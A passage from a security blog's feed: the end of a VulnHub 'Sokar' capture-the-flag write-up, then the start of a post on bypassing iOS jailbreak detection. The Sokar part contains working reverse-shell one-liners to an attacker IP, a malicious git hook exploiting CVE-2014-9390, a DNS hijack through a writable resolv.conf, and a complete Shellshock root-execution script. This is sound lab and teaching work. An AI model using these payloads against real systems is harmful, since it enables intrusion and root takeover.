&lt;p&gt;Running the binary in &lt;code&gt;gdb&lt;/code&gt; and setting a breakpoint before the &lt;code&gt;system()&lt;/code&gt; call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted &lt;strong&gt;and&lt;/strong&gt; decrypted versions of the string to be executed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sokar # gdb -q ./build
gdb-peda$ r
Build? (Y/N) n
OK :(
[Inferior 1 (process 4450) exited with code 06]
Warning: not running or target is remote
gdb-peda$ b *0x0000555555554a38
Breakpoint 1 at 0x555555554a38
gdb-peda$ r
Build? (Y/N) Y
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RCX: 0x7ffff7b26e99 (&amp;lt;setreuid+25&amp;gt;: cmp    rax,0xfffffffffffff000)
RDX: 0x7fffffffe7a0 (&amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;)
RSI: 0x0
RDI: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RBP: 0x7fffffffe830 --&amp;gt; 0x0
RSP: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RIP: 0x555555554a38 (&amp;lt;main+329&amp;gt;:    mov    eax,0x0)
R8 : 0x51 (&#39;Q&#39;)
R9 : 0x51 (&#39;Q&#39;)
R10: 0x0
R11: 0x246
R12: 0x7fffffffe7a0 (&amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;)
R13: 0x7fffffffe910 --&amp;gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554a2b &amp;lt;main+316&amp;gt;:   mov    eax,0x0
   0x555555554a30 &amp;lt;main+321&amp;gt;:   call   0x5555555547a0 &amp;lt;setreuid@plt&amp;gt;
   0x555555554a35 &amp;lt;main+326&amp;gt;:   mov    rdi,rbx
=&amp;gt; 0x555555554a38 &amp;lt;main+329&amp;gt;:   mov    eax,0x0
   0x555555554a3d &amp;lt;main+334&amp;gt;:   call   0x555555554750 &amp;lt;system@plt&amp;gt;
   0x555555554a42 &amp;lt;main+339&amp;gt;:   mov    rsp,r12
   0x555555554a45 &amp;lt;main+342&amp;gt;:   jmp    0x555555554a5d &amp;lt;main+366&amp;gt;
   0x555555554a47 &amp;lt;main+344&amp;gt;:   lea    rsi,[rip+0x12c]        # 0x555555554b7a
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0008| 0x7fffffffe748 (&amp;quot;/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0016| 0x7fffffffe750 (&amp;quot;ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0024| 0x7fffffffe758 (&amp;quot;/root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0032| 0x7fffffffe760 (&amp;quot;kar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0040| 0x7fffffffe768 (&amp;quot;/root/secret-project /mnt/secret-project/&amp;quot;)
0048| 0x7fffffffe770 (&amp;quot;cret-project /mnt/secret-project/&amp;quot;)
0056| 0x7fffffffe778 (&amp;quot;ject /mnt/secret-project/&amp;quot;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554a38 in main ()
gdb-peda$ x/x $rbx
0x7fffffffe740: 0x2f
gdb-peda$ x/s $rbx
0x7fffffffe740:  &amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;
gdb-peda$ x/s $rdx
0x7fffffffe7a0:  &amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Right before this call though, there is a instruction to &lt;code&gt;call   0x5555555547a0 &amp;lt;setreuid@plt&amp;gt;&lt;/code&gt; to set the UID to 0. So, this brought me to the conclusion that &lt;code&gt;build&lt;/code&gt; is running &lt;code&gt;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&lt;/code&gt; as &lt;code&gt;root&lt;/code&gt;. But what is so special about this?&lt;/p&gt;

&lt;h3 id=&#34;inspecting-git&#34;&gt;inspecting git&lt;/h3&gt;

&lt;p&gt;I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a &lt;code&gt;git clone&lt;/code&gt; as root? One of my first theories was that if I could get &lt;code&gt;sokar-dev&lt;/code&gt; to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions &lt;code&gt;git&lt;/code&gt; will honor really is the symlink and executable bits :(&lt;/p&gt;

&lt;p&gt;Further enumeration while I was thinking about the possibilities revealed that &lt;code&gt;/mnt/&lt;/code&gt; was actually mounted with the &lt;code&gt;vfat&lt;/code&gt; filesystem!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;mount; cat /etc/fstab&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;mount; cat /etc/fstab&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
/dev/sda1 on / type ext4 (rw)
proc on /proc type proc (rw)
sysfs on /sys type sysfs (rw)
devpts on /dev/pts type devpts (rw,gid=5,mode=620)
tmpfs on /dev/shm type tmpfs (rw)
/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)

#
# /etc/fstab
# Created by anaconda on Wed Nov 12 13:29:15 2014
#
# Accessible filesystems, by reference, are maintained under &#39;/dev/disk&#39;
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
UUID=cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        1 1
tmpfs                   /dev/shm                tmpfs   defaults        0 0
devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
sysfs                   /sys                    sysfs   defaults        0 0
proc                    /proc                   proc    defaults        0 0
/dev/sdb1       /mnt            vfat    defaults,uid=501,gid=502    0 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, &lt;code&gt;/mnt&lt;/code&gt; also specified the uid/gid for files on the mount, so even if I &lt;em&gt;were&lt;/em&gt; able to get a suid shell onto the file system, root will not be the one owning it.&lt;/p&gt;

&lt;p&gt;However. &lt;code&gt;vfat&lt;/code&gt;. Why &lt;code&gt;vfat&lt;/code&gt;&amp;hellip; Of course! &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390&#34;&gt;CVE-2014-9390&lt;/a&gt;. The potential client side code execution bug in older &lt;code&gt;git&lt;/code&gt; versions where a case insensitive filesystem may cause the &lt;code&gt;git&lt;/code&gt; client to read hooks from &lt;code&gt;.Git/hooks&lt;/code&gt; instead of &lt;code&gt;.git/hooks&lt;/code&gt;. And, of course, &lt;code&gt;vfat&lt;/code&gt; is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.&lt;/p&gt;

&lt;p&gt;I checked up on the installed version of &lt;code&gt;git&lt;/code&gt; on Sokar, just to make sure that it is in fact vulnerable:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;git --version&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;git --version&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
git version 2.2.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. &lt;code&gt;git&lt;/code&gt; version 2.2.1 fixed this bug so we are in luck.&lt;/p&gt;

&lt;h2 id=&#34;rooting-sokar&#34;&gt;rooting sokar&lt;/h2&gt;

&lt;p&gt;All of this information was great to have, but it still had one major problem. How can I clone a repository &lt;strong&gt;I&lt;/strong&gt; own? I made &lt;em&gt;countless&lt;/em&gt; attempts to try fool the environment into resolving &lt;code&gt;sokar-dev&lt;/code&gt; to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &amp;lsquo;cleans up&amp;rsquo; the environment, especially for reasons such as this one.&lt;/p&gt;

&lt;p&gt;I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;find /etc/ -writable -type f 2&amp;gt;/dev/null | xargs ls -lh&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;find /etc/ -writable -type f 2&amp;gt;/dev/null | xargs ls -lh&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
-rw-rw-rw- 1 root root 19 Jan  2 20:12 /etc/resolv.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;/etc/resolv.conf&lt;/code&gt; is &lt;strong&gt;world writable&lt;/strong&gt;. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D&lt;/p&gt;

&lt;h3 id=&#34;preparing-the-environment-and-exploit&#34;&gt;preparing the environment and exploit&lt;/h3&gt;

&lt;p&gt;I decided to use &lt;code&gt;dnsmasq&lt;/code&gt; for a quick to setup DNS server. I added a line to &lt;code&gt;/etc/dnsmasq.hosts&lt;/code&gt; to answer a query for &lt;code&gt;sokar-dev&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
192.168.217.174 sokar-dev
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and started the &lt;code&gt;dnsmasq&lt;/code&gt; server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts

dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.252.2#53
dnsmasq: read /etc/hosts - 6 addresses
dnsmasq: read /etc/dnsmasq.hosts - 1 addresses
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Testing my DNS server proved that it was working just fine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ dig sokar-dev @127.0.0.1

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.4-rpz2+rl005.12-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; sokar-dev @127.0.0.1
;; global options: +cmd
;; Got answer:
;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 48044
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;sokar-dev.         IN  A

;; ANSWER SECTION:
sokar-dev.      0   IN  A   192.168.217.174

;; Query time: 13 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Feb  3 12:12:02 2015
;; MSG SIZE  rcvd: 43
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome. The next step was to replace the contents of Sokar&amp;rsquo;s &lt;code&gt;/etc/resolv.conf&lt;/code&gt; so that the dns server to use is &lt;em&gt;192.168.217.174&lt;/em&gt; with the command &lt;code&gt;python apophis.py &amp;quot;echo \&amp;quot;nameserver\ 192.168.217.174\&amp;quot; &amp;gt; /etc/resolv.conf&amp;quot;&lt;/code&gt; and confirm that it worked:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;cat /etc/resolv.conf&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;cat /etc/resolv.conf&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
nameserver 192.168.217.174
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. Testing time!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;echo Y | /home/apophis/build&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
Cloning into &#39;/mnt/secret-project&#39;...
Host key verification failed.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yesssssss, and nooooooooo. From the &lt;code&gt;dnsmasq&lt;/code&gt; console output I could see the request for &lt;code&gt;sokar-dev&lt;/code&gt; coming in and a reply getting sent:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dnsmasq: query[A] sokar-dev from 192.168.217.163
dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &amp;lsquo;yes&amp;rsquo;. I can not use &lt;code&gt;ssh-keyscan &amp;gt;&amp;gt; ~/.ssh/known_hosts&lt;/code&gt; as I can&amp;rsquo;t write to &lt;code&gt;root&lt;/code&gt;&amp;rsquo;s &lt;code&gt;.ssh&lt;/code&gt; directory, nor can I modify the command that is being passed onto &lt;code&gt;system()&lt;/code&gt; in the binary to specify &lt;code&gt;-o StrictHostKeyChecking=no&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Unfortunately, due to these restrictions, I had to finally give in and go one step back to &lt;code&gt;bynarr.py&lt;/code&gt; and use his allowed egress access on &lt;code&gt;tcp/51242&lt;/code&gt; to build a interactive shell. On one session I started a netcat listener, and on another, I ran &lt;code&gt;python bynarr.py &amp;quot;/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.217.174 51242 &amp;gt;/tmp/f&amp;quot;&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ nc -lvp 51242
listening on [any] 51242 ...
192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] 40382
sh: no job control in this shell
sh-4.1$ python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
[bynarr@sokar cgi-bin]$ su - apophis
su - apophis
Password: overdrive

[apophis@sokar ~]$ id
id
uid=501(apophis) gid=502(apophis) groups=502(apophis)
[apophis@sokar ~]$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the interactive shell as &lt;code&gt;apophis&lt;/code&gt; now, I was able to accept the SSH hostkey check.&lt;/p&gt;

&lt;p&gt;The next thing left on the list was to prepare a &lt;code&gt;git&lt;/code&gt; repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for &lt;code&gt;/root/secret-project&lt;/code&gt;, I prepared just that on my Kali VM:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ cd /root
leonjza@kali/root $ mkdir secret-project
leonjza@kali/root $ cd secret-project
leonjza@kali/root/secret-project $ git init --bare
Initialized empty Git repository in /root/secret-project/
leonjza@kali/root/secret-project | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it&amp;hellip; Next, I cloned it locally in a different folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
Cloning into &#39;secret-project&#39;...
root@127.0.0.1&#39;s password:
warning: You appear to have cloned an empty repository.
leonjza@kali/sokar $ cd secret-project
leonjza@kali/sokar/secret-project | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Done. Working from a PoC exploit found &lt;a href=&#34;https://gitlab.com/mehmet/cve-2014-9390&#34;&gt;here&lt;/a&gt;, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&amp;rsquo;s) on a &lt;code&gt;tcp/22&lt;/code&gt; netcat listener, spawning a shell. I knew &lt;code&gt;tcp/22&lt;/code&gt; traffic was allowed due to the SSH host key verification step that needed some work :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
leonjza@kali/sokar/secret-project | git:master $ cd .Git
leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks
leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout
#!/bin/sh
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.217.1/22 0&amp;gt;&amp;amp;1
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m &#39;pwnd&#39;
[master (root-commit) ee364fd] pwnd
 Committer: root &amp;lt;root@localhost.localdomain&amp;gt;

 1 file changed, 2 insertions(+)
 create mode 100755 .Git/hooks/post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master
root@127.0.0.1&#39;s password:
Counting objects: 5, done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (5/5), 345 bytes, done.
Total 5 (delta 0), reused 0 (delta 0)
To ssh://127.0.0.1/root/secret-project
 * [new branch]      master -&amp;gt; master
Branch master set up to track remote branch master from origin.
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With my evil repository ready, it was time to try that &lt;code&gt;build&lt;/code&gt; again :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[apophis@sokar ~]$ ./build
./build
Build? (Y/N) Y
Y
Cloning into &#39;/mnt/secret-project&#39;...
root@sokar-dev&#39;s password: # redact lol

remote: Counting objects: 5, done.
remote: Compressing objects: 100% (2/2), done.
Receiving objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 0 (delta 0)
Checking connectivity... done.

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This shell just &amp;lsquo;hung&amp;rsquo; there, however, the netcat listener on my Mac had a different story to tell:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;leonjza@laptop » sudo nc -lv 22
Password:
[root@sokar secret-project]# cat /root/flag
cat /root/flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/\/\/\/\/\/\/\/\/\/\/\/|
  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 _|___|_______________________|___|__
|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse (@_RastaMouse)     |
=====================================
[root@sokar secret-project]#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;What a blast! Them feels of r00t are so &lt;em&gt;gooood&lt;/em&gt;. For the curios, that firewall that was making life so difficult:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@sokar secret-project]# cat /etc/sysconfig/iptables
cat /etc/sysconfig/iptables
# Firewall configuration written by system-config-firewall
# Manual customization of this file is not recommended.
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p icmp -j DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state ESTABLISHED -p tcp --sport 22 -j ACCEPT
-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT
-A INPUT -p udp --sport 53 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner 0 -p tcp --dport 22 -j ACCEPT
-A OUTPUT -p udp --dport 53 -m owner --uid-owner 0 -j ACCEPT
-A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT
-A OUTPUT -j DROP
COMMIT
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;edit&#34;&gt;edit&lt;/h2&gt;

&lt;p&gt;I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the &lt;code&gt;lime&lt;/code&gt; script run with &lt;code&gt;sudo&lt;/code&gt; can be shocked too!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# 2015 Leon Jacobs
# sokar remote root command execution

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

# Grab the command from the args
command = sys.argv[1].strip()

# prep to shock the lime script
root_command = &amp;quot;&amp;quot;&amp;quot;echo &amp;quot;N&amp;quot; | sudo MAIL=\\&amp;quot;() { :;}; %s;\\&amp;quot; /home/bynarr/lime&amp;quot;&amp;quot;&amp;quot; % command

# prep to exec the command as bynarr
payload = &amp;quot;&amp;quot;&amp;quot;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;%s&#39;, &#39;bynarr&#39;]);&amp;quot; &amp;quot;&amp;quot;&amp;quot; % root_command

# be verbose about the full command
print &amp;quot; * Executing %s\n&amp;quot; % payload

# Send the sploit
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % payload }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run with &lt;code&gt;python root.py &amp;quot;/bin/cat /root/flag&amp;quot;&lt;/code&gt; :D&lt;/p&gt;

&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; for the VM, and as always, &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting and great community!&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>a trivial iOS jailbreak detection bypass</title>
      <link>https://leonjza.github.io/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/</link>
      <pubDate>Fri, 20 Feb 2015 21:09:21 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;Not too long ago, I toyed with a &lt;a href=&#34;https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/&#34;&gt;Android root detection bypass&lt;/a&gt;. In a similar scenario, I was poking at a iOS application that also had some root detection built in. For very much the same purpose, I suppose the application has its own ~reasons~ for the jailbreak detection. Of course, this makes the testing I &lt;em&gt;actually&lt;/em&gt; wanted to do impossible as I&amp;rsquo;d very much like to dig under the hood :)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ios_jailbreak_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;So, its was time to try and bypass the jailbreak detection of the application.
All I had to work with was a &lt;code&gt;.ipa&lt;/code&gt;. Similar to the android &lt;code&gt;.apk&lt;/code&gt; file, the &lt;code&gt;.ipa&lt;/code&gt; is also just a zipped up archive of the actual application files. To test with, I had a iPad mini. The iPad was running the latest iOS (8.1.2 at the time of this post) and was also jailbroken. If I remember correctly the jailbreak tool used was called TaiG. Anyways, inside the applications &lt;code&gt;.ipa&lt;/code&gt; archive was a whole bunch of resource files and what not, including the compiled application executable. This executable is what is of interest.&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;understanding-the-behavior&#34;&gt;understanding the behavior&lt;/h2&gt;

&lt;p&gt;I installed the app onto my iPad, and started to inspect its behavior. When the application starts, it would immediately throw a security related error, notifying the user that it has detected the environment as one that is jailbroken. This happens pretty fast too. Once the jailbreak detection error shows, the application refuses to continue to run. Restarting the application simply continues this loop.&lt;/p&gt;

&lt;p&gt;I studied some iOS jailbreak detection methods online which revealed many of them as being pretty obvious. From detecting the presence of &lt;code&gt;/bin/bash&lt;/code&gt; or &lt;code&gt;Cydia.app&lt;/code&gt;, to examining the exit status if &lt;code&gt;fork()&lt;/code&gt;. There are some more advanced methods as well such as checking the existence of certain known &lt;a href=&#34;https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/DynamicLibraryUsageGuidelines.html&#34;&gt;dylib&lt;/a&gt;&amp;rsquo;s too (which apparently is the hardest to circumvent). For the purpose of this post, the jailbreak detection was pretty weak and did not have any of the more advanced methods implemented. In fact, I am pretty sure there won’t be that many apps out there that will be this easy to bypass.&lt;/p&gt;

&lt;h2 id=&#34;discovering-the-implementation&#34;&gt;discovering the implementation&lt;/h2&gt;

&lt;p&gt;Armed with some knowledge of how its typically done in the iOS world, I proceeded to take a look at the actual application binary:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@laptop » file myApplication
myApplication: Mach-O executable arm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Compiled as a &lt;em&gt;Mach-O executable&lt;/em&gt; from Objective-C, I loaded up the binary from the extracted &lt;code&gt;.ipa&lt;/code&gt; into the Hopper disassembler to help me get an idea of what is happening. Hopper has some nice features such as generating pseudo code etc, so I quite like using it for these types of excursions. To start off, I searched around for strings that were related to the word &lt;strong&gt;jailbreak&lt;/strong&gt; within the app. Class definitions, methods or any strings related to the term jailbreak was ok. I just wanted to get something to start off with. I found nothing.&lt;/p&gt;

&lt;p&gt;Of course this had me thinking that I may have missed the plot entirely. I continued to search for other things related to jailbreaking, and got a hit immediately for the term &lt;code&gt;/bin/bash&lt;/code&gt; in the &lt;em&gt;string&lt;/em&gt; section:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ios_jailbreak_hopper.png&#34; /&gt;
    
    
&lt;/figure&gt;


